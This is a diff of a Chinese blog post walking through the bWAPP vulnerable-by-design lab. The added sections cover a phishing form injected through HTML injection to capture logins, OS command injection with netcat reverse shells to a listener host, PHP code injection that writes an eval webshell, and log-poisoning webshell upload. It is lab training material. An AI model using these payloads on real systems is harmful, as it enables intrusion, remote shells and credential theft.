@@ -81,13 +81,13 @@
 
 
 
-<meta name="description" content="bwapp玩法总结之一html注入html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img sr">
+<meta name="description" content="bwapp玩法总结之一html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img src=&amp;quo">
 <meta name="keywords" content="bwapp玩法,bwapp靶机,web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bwapp玩法总结之一">
 <meta property="og:url" content="http://yoursite.com/2018/10/17/bwapp玩法总结之一/index.html">
 <meta property="og:site_name" content="refreshing18">
-<meta property="og:description" content="bwapp玩法总结之一html注入html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img sr">
+<meta property="og:description" content="bwapp玩法总结之一html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img src=&amp;quo">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2018/10/07/5bb9c2b463e3d.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/07/5bb9c4700786b.png">
@@ -108,6 +108,8 @@
 <meta property="og:image" content="https://i.loli.net/2018/10/07/5bba0df693a40.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/07/5bba0ed348571.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbaf42d7c907.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd05bd22662a.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd05cdd70d88.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbb04b838fa9.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbb059405d5b.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbb3e25b0b13.png">
@@ -119,10 +121,19 @@
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbb48ca191fb.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbb4a841feb1.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/08/5bbb059405d5b.png">
-<meta property="og:updated_time" content="2018-10-17T11:00:53.010Z">
+<meta property="og:image" content="https://i.loli.net/2018/10/23/5bceb7091fbae.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/23/5bcebd99c84b5.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/23/5bcebe1a49666.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd05fefd440b.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/23/5bcec73ad400c.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd063dbbb2bb.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd0680a86054.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd069d01db9c.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/24/5bd06a6608a03.png">
+<meta property="og:updated_time" content="2018-10-24T12:51:29.665Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bwapp玩法总结之一">
-<meta name="twitter:description" content="bwapp玩法总结之一html注入html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img sr">
+<meta name="twitter:description" content="bwapp玩法总结之一html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img src=&amp;quo">
 <meta name="twitter:image" content="https://i.loli.net/2018/10/07/5bb9c2b463e3d.png">
 
 
@@ -358,8 +369,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/靶机/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机</span>
+                  <a href="/categories/bwapp/" itemprop="url" rel="index">
+                    <span itemprop="name">bwapp</span>
                   </a>
                 </span>
 
@@ -400,7 +411,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.8k
+                  2.9k
                 </span>
               
 
@@ -416,7 +427,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7
+                  12
                 </span>
               
             </div>
@@ -437,7 +448,7 @@
       
 
       
-        <h1 id="bwapp玩法总结之一"><a href="#bwapp玩法总结之一" class="headerlink" title="bwapp玩法总结之一"></a>bwapp玩法总结之一</h1><h2 id="html注入"><a href="#html注入" class="headerlink" title="html注入"></a>html注入</h2><h3 id="html-injection-Reflected-GET-类型"><a href="#html-injection-Reflected-GET-类型" class="headerlink" title="html injection-Reflected(GET)类型"></a>html injection-Reflected(GET)类型</h3><p>1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）</p>
+        <h1 id="bwapp玩法总结之一"><a href="#bwapp玩法总结之一" class="headerlink" title="bwapp玩法总结之一"></a>bwapp玩法总结之一</h1><h3 id="html-injection-Reflected-GET-类型"><a href="#html-injection-Reflected-GET-类型" class="headerlink" title="html injection-Reflected(GET)类型"></a>html injection-Reflected(GET)类型</h3><p>1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）</p>
 <p><img src="https://i.loli.net/2018/10/07/5bb9c2b463e3d.png" alt="图片1"></p>
 <p>输入<code>&lt;script&gt;alert(11)&lt;/script&gt;</code>可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）</p>
 <p><img src="https://i.loli.net/2018/10/07/5bb9c4700786b.png" alt=""></p>
@@ -490,6 +501,12 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../index.png"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2018/10/08/5bbaf42d7c907.png" alt="volcano18"></p>
 <p>等一些后期利用方面可以自己随便选取一个模块自己练手，本人在这里只针对这些模块的一些绕过方式和利用方式进行讲解。</p>
+<p>一种有趣的玩法：直接留言如下代码，在自己的kali中使用nc -lvp 80进行监听，可以直接查看用户输入的用户名和密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;&quot;&gt;Please login with valid credentials:&lt;br&gt;&lt;form name=&quot;login&quot; action=&quot;http://192.168.174.133/login.htm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=2 align=center&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>输入上述代码后，会出现如下用户名和密码的输入框：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd05bd22662a.png" alt="18"></p>
+<p>在输入框输入用户名和密码后，会在kali虚拟机上面接受的相应的用户名和密码，比如我输入admin123和volcano18，会在kali上出现如下结果：即得到对方的用户名和密码。</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd05cdd70d88.png" alt="12"></p>
 <p>2，在medium级别下，试了很久没有成功执行脚本，最后无奈，只好查看源码了，查看源码发现，不论是medium级别还是high级别，都使用了xss_check_3函数进行了过滤，源码如下：</p>
 <p><img src="https://i.loli.net/2018/10/08/5bbb04b838fa9.png" alt="volcano18"></p>
 <p>对留言框的输入使用了xss_check_3函数进行过滤，xss_check_3函数源码如下：</p>
@@ -517,6 +534,59 @@
 <p>在high级别下，使用的是xss_check_3()函数进行过滤</p>
 <p><img src="https://i.loli.net/2018/10/08/5bbb059405d5b.png" alt="volcano18"></p>
 <p>该函数中采用了防止xss注入的终极函数htmlspecialchars()，所以无法进行注入。</p>
+<h2 id="LDAP-Connection-Settings"><a href="#LDAP-Connection-Settings" class="headerlink" title="LDAP Connection Settings"></a>LDAP Connection Settings</h2><p>这个ldap注入不会呀，应该是环境没有搭建好，懒得搞。</p>
+<h2 id="LDAP-Connection-Settings-1"><a href="#LDAP-Connection-Settings-1" class="headerlink" title="LDAP Connection Settings"></a>LDAP Connection Settings</h2><p>应该也是环境没有搭建好，懒得搞。</p>
+<h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><p>在low级别下：直接进行命令执行没有任何过滤。</p>
+<p><a href="http://www.baidu.com&amp;&amp;net" target="_blank" rel="noopener">www.baidu.com&amp;&amp;net</a> user</p>
+<p><a href="http://www.baidu.com&amp;&amp;ifconfig" target="_blank" rel="noopener">www.baidu.com&amp;&amp;ifconfig</a></p>
+<p><a href="http://www.baidu.com&amp;&amp;ls" target="_blank" rel="noopener">www.baidu.com&amp;&amp;ls</a></p>
+<p>对&amp;&amp;符，|符，&amp;符号的一些解释。</p>
+<p>command1 &amp;&amp; command2   先执行command1后执行command2<br>command1 | command2     只执行command2<br>command1 &amp; command2    先执行command2后执行command1</p>
+<p>Command 1&amp;&amp;Command 2<br>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
+<p>Command 1&amp;Command 2<br>先执行Command 1，不管是否成功，都会执行Command 2</p>
+<p>一般像这种的命令执行就直接反弹shell了，反弹方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在浏览器输入框输入</span><br><span class="line">www.baidu.com|nc 192.168.174.133 1818 -e /bin/bash</span><br><span class="line">在自己的kali上进行监听</span><br><span class="line">nc -lp 1818 -v</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/23/5bceb7091fbae.png" alt="1"></p>
+<p>在medium级别下：</p>
+<p>对&amp;&amp;符和分号;进行了过滤，但是并没有对管道符进行过滤，照样绕过。</p>
+<p>127.0.0.1|ls</p>
+<p>下面就不使用上述的方法反弹shell了，使用kali自带的一种工具commix进行命令注入,使用方法和sqlmap类型，使用方法如下：</p>
+<p>commix -u “<a href="http://192.168.174.130/bWAPP/commandi.php&quot;" target="_blank" rel="noopener">http://192.168.174.130/bWAPP/commandi.php&quot;</a> –data=”target=127.0.0.1&amp;form=submit” –cookie=”security_level=1; PHPSESSID=8df91cf7aabc31f6a57a52246338a94c”</p>
+<p>成功拿到shell。</p>
+<p><img src="https://i.loli.net/2018/10/23/5bcebd99c84b5.png" alt="1"></p>
+<p><img src="https://i.loli.net/2018/10/23/5bcebe1a49666.png" alt="123"></p>
+<p>在high级别下，继续使用commix发现也出了shell但是其实是没法执行命令的，个人认为是commix的缓存作用，sqlmap也遇到过类似的情况。</p>
+<p>commix一用就上瘾了啊。</p>
+<h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection - Blind"></a>OS Command Injection - Blind</h2><p>本人没有注入，有兴趣的可以参考博客：<a href="http://thehackpot.blogspot.com/2014/05/blind-os-command-injection-attacks.html" target="_blank" rel="noopener">http://thehackpot.blogspot.com/2014/05/blind-os-command-injection-attacks.html</a></p>
+<h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h2><p>在url后面直接加上</p>
+<p>?message=id</p>
+<p>即将url设置为：<a href="http://192.168.174.130/bWAPP/phpi.php?message=pwd发现直接返回了pwd" target="_blank" rel="noopener">http://192.168.174.130/bWAPP/phpi.php?message=pwd发现直接返回了pwd</a></p>
+<p>于是将message的值设置为：message=pwd;system(pwd)发现命令pwd被执行了，执行结果如下：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd05fefd440b.png" alt="3"></p>
+<p>于是立刻进行写马，然后使用菜刀直接连接，竟然真的连接上了，开心。</p>
+<p>fputs(fopen(‘1.php’,’w+’),’&lt;?php @eval(\$_POST[volcano18])?&gt;’)</p>
+<p><img src="https://i.loli.net/2018/10/23/5bcec73ad400c.png" alt="volcano18"></p>
+<p>既然系统命令都可以直接执行了，那么在这里也可以反弹shell，将message的值设置为test;system(‘nc 192.168.174.133 7777 -e /bin/bash’)</p>
+<p>在kali上对7890端口进行监听</p>
+<p>nc -lvp 7777</p>
+<p>成功反弹shell</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd063dbbb2bb.png" alt="1540383037973"></p>
+<p>emmmm,每次反弹shell时，靶机就变卡了，可怕。</p>
+<p>在medium下和high级别下使用的htmlspecialchars()函数进行了过滤，没法注入，其实个人很是不喜欢bwapp，因为他总是喜欢将中级和高级的难度设置成一样的，搞得我每次都在中级停留好久。</p>
+<p>过滤代码如下：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd0680a86054.png" alt="18"></p>
+<p>推荐一篇关于php code injection的文章：<a href="http://www.polaris-lab.com/index.php/archives/254/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/254/</a></p>
+<h2 id="Server-Side-Includes-SSI-Injection-服务器端包含注入"><a href="#Server-Side-Includes-SSI-Injection-服务器端包含注入" class="headerlink" title="Server-Side Includes (SSI) Injection(服务器端包含注入)"></a>Server-Side Includes (SSI) Injection(服务器端包含注入)</h2><p>由于本人并没有做过web开发，所以自然对ssl并不是很了解，今年干一年web开发，日后会进行补充。下面找到一篇有关ssl注入的文章：</p>
+<p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
+<!--#exec cmd = "id"-->
+<h2 id="bwapp日志写马拿shell"><a href="#bwapp日志写马拿shell" class="headerlink" title="bwapp日志写马拿shell"></a>bwapp日志写马拿shell</h2><p>找到bwapp靶机中的日志目录为：</p>
+<p><a href="http://192.168.174.130/var/log/apache2/access.log" target="_blank" rel="noopener">http://192.168.174.130/var/log/apache2/access.log</a></p>
+<p>直接写木马了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.174.130/&lt;?php @eval($_POST[volcano18]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>虽然有报错目录不存在，但是这个报错也被记录在了bwapp靶机的错误日志目录中，好了，直接用菜刀连接吧，</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd069d01db9c.png" alt="6"></p>
+<p>直接就连接上了：</p>
+<p><img src="https://i.loli.net/2018/10/24/5bd06a6608a03.png" alt="7"></p>
 
       
     </div>
@@ -692,7 +762,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -759,7 +829,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bwapp玩法总结之一"><span class="nav-number">1.</span> <span class="nav-text">bwapp玩法总结之一</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#html注入"><span class="nav-number">1.1.</span> <span class="nav-text">html注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-Reflected-GET-类型"><span class="nav-number">1.1.1.</span> <span class="nav-text">html injection-Reflected(GET)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-Reflected-post-类型"><span class="nav-number">1.1.2.</span> <span class="nav-text">html injection-Reflected(post)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-Reflected-url-类型"><span class="nav-number">1.1.3.</span> <span class="nav-text">html injection-Reflected(url)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-stored-blog-类型"><span class="nav-number">1.1.4.</span> <span class="nav-text">html injection-stored(blog)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iFrame-Injection类型"><span class="nav-number">1.1.5.</span> <span class="nav-text">iFrame Injection类型</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bwapp玩法总结之一"><span class="nav-number">1.</span> <span class="nav-text">bwapp玩法总结之一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-Reflected-GET-类型"><span class="nav-number">1.0.1.</span> <span class="nav-text">html injection-Reflected(GET)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-Reflected-post-类型"><span class="nav-number">1.0.2.</span> <span class="nav-text">html injection-Reflected(post)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-Reflected-url-类型"><span class="nav-number">1.0.3.</span> <span class="nav-text">html injection-Reflected(url)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#html-injection-stored-blog-类型"><span class="nav-number">1.0.4.</span> <span class="nav-text">html injection-stored(blog)类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iFrame-Injection类型"><span class="nav-number">1.0.5.</span> <span class="nav-text">iFrame Injection类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP-Connection-Settings"><span class="nav-number">1.1.</span> <span class="nav-text">LDAP Connection Settings</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP-Connection-Settings-1"><span class="nav-number">1.2.</span> <span class="nav-text">LDAP Connection Settings</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OS-Command-Injection"><span class="nav-number">1.3.</span> <span class="nav-text">OS Command Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OS-Command-Injection-Blind"><span class="nav-number">1.4.</span> <span class="nav-text">OS Command Injection - Blind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-Code-Injection"><span class="nav-number">1.5.</span> <span class="nav-text">PHP Code Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-Side-Includes-SSI-Injection-服务器端包含注入"><span class="nav-number">1.6.</span> <span class="nav-text">Server-Side Includes (SSI) Injection(服务器端包含注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bwapp日志写马拿shell"><span class="nav-number">1.7.</span> <span class="nav-text">bwapp日志写马拿shell</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -809,7 +879,7 @@
 -->
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共4.6k字</span>
+  <span class="post-count">博客全站共5.8k字</span>
 </div>
 
         
